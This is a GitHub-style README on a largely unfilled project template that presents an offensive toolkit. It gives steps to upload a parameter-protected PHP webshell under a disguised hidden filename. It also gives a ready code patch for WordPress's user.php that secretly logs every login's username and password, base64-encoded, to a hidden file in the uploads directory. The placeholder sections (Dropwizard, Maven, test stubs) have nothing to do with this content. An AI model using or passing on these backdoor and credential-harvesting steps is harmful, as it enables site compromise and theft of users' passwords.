# JustRepository

One Paragraph of project description goes here

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.

### Webshell.php

simple webshell that protected with parameter.
Upload shell. rename it with ".page.backup.php". 
Call it with your own parameter:
```
example.com/uploads/.page.backup.php?dxnboy=4343
```

### Inject Wordpress

Inject user.php in wordpress to record credentials that login. Required user priviledge that can write to wordpress directory. 
edit file wordpress/wp-include/user.php.

before
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
} else {
                $credentials['remember'] = false;
}
```

after inject
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
} else {
                $credentials['remember'] = false;
                $credz = date('Y-m-d') . "Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.php.swp', base64_encode($credz).PHP_EOL, FILE_APPEND);
}
```

Encoded with base64. call it in: and decode it with base64
```
wordpress/wp-content/uploads/.page.php.swp
```

## Running the tests

Explain how to run the automated tests for this system

### Break down into end to end tests

Explain what these tests test and why

```
Give an example
```

### And coding style tests

Explain what these tests test and why

```
Give an example
```

## Deployment

Add additional notes about how to deploy this on a live system

## Built With

* [Dropwizard](http://www.dropwizard.io/1.0.2/docs/) - The web framework used
* [Maven](https://maven.apache.org/) - Dependency Management
* [ROME](https://rometools.github.io/rome/) - Used to generate RSS Feeds

## Contributing

Please read [CONTRIBUTING.md](https://gist.github.com/PurpleBooth/b24679402957c63ec426) for details on our code of conduct, and the process for submitting pull requests to us.

## Versioning

We use [SemVer](http://semver.org/) for versioning. For the versions available, see the [tags on this repository](https://github.com/your/project/tags). 

## Authors

* **Billie Thompson** - *Initial work* - [PurpleBooth](https://github.com/PurpleBooth)

See also the list of [contributors](https://github.com/your/project/contributors) who participated in this project.

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Acknowledgments

* Hat tip to anyone whose code was used
* Inspiration
* etc
